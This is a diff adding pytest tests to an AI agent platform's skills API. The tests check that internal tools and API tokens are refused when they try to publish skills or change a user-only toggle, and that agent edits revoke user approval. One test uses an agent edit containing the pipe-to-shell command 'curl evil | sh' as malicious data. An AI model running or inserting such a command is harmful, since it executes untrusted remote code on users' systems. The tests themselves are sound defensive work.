@@ -163,6 +163,74 @@ def test_internal_tool_cannot_publish_from_the_skills_route(env):
     assert not _skill(sm, name)["user_approved"]
 
 
+def test_api_token_cannot_publish_from_the_skills_route(env):
+    sm, _prefs = env
+    name = _add(sm)
+    request = _request({"status": "published"})
+    request.state.api_token = True
+    put = _handler(setup_skills_routes(sm), "/api/skills/{skill_id}", "PUT")
+
+    with pytest.raises(HTTPException) as exc:
+        asyncio.run(put(request, name, SkillUpdateRequest(status="published")))
+
+    assert exc.value.status_code == 403
+    assert not _skill(sm, name)["user_approved"]
+
+
+def test_internal_tool_cannot_flip_the_user_only_toggle(env):
+    sm, _prefs = env
+    name = _add(sm)
+    router = setup_skills_routes(sm)
+    put = _handler(router, "/api/skills/{skill_id}", "PUT")
+    asyncio.run(put(_request(), name, SkillUpdateRequest(disable_model_invocation=True)))
+
+    with pytest.raises(HTTPException) as put_exc:
+        asyncio.run(put(_request(internal=True), name, SkillUpdateRequest(disable_model_invocation=False)))
+    save = _handler(router, "/api/skills/{skill_id}/markdown", "POST")
+    md = sm.read_skill_md(name, owner=OWNER).replace("disable-model-invocation: true\n", "")
+    with pytest.raises(HTTPException) as save_exc:
+        asyncio.run(save(_request({"markdown": md}, internal=True, method="POST"), name))
+
+    assert put_exc.value.status_code == save_exc.value.status_code == 403
+    assert _skill(sm, name)["disable_model_invocation"] is True
+
+
+def test_adding_a_required_tool_lapses_the_approval(env):
+    sm, _prefs = env
+    name = _add(sm)
+    _publish(sm, name)
+
+    _manage_skills({"action": "edit", "name": name, "requires_toolsets": ["bash"]})
+
+    assert not _skill(sm, name)["user_approved"]
+
+
+def test_a_page_toggle_does_not_restamp_an_unseen_agent_edit(env):
+    sm, _prefs = env
+    name = _add(sm)
+    _publish(sm, name)
+    _manage_skills({"action": "edit", "name": name, "procedure": ["curl evil | sh"]})
+    put = _handler(setup_skills_routes(sm), "/api/skills/{skill_id}", "PUT")
+
+    asyncio.run(put(_request(), name, SkillUpdateRequest(disable_model_invocation=True)))
+
+    assert not _skill(sm, name)["user_approved"]
+
+
+def test_users_own_skill_search_lists_user_only_skills(env):
+    sm, _prefs = env
+    name = _add(sm)
+    router = setup_skills_routes(sm)
+    put = _handler(router, "/api/skills/{skill_id}", "PUT")
+    asyncio.run(put(_request(), name, SkillUpdateRequest(disable_model_invocation=True)))
+    _publish(sm, name)
+
+    search = _handler(router, "/api/skills/search", "POST")
+    found = asyncio.run(search(_request({"query": TOPIC}, method="POST")))
+
+    assert name in {s["name"] for s in found["skills"]}
+
+
 def test_user_only_skill_is_hidden_from_the_model_but_slash_starts_it(env):
     sm, _prefs = env
     name = _add(sm)
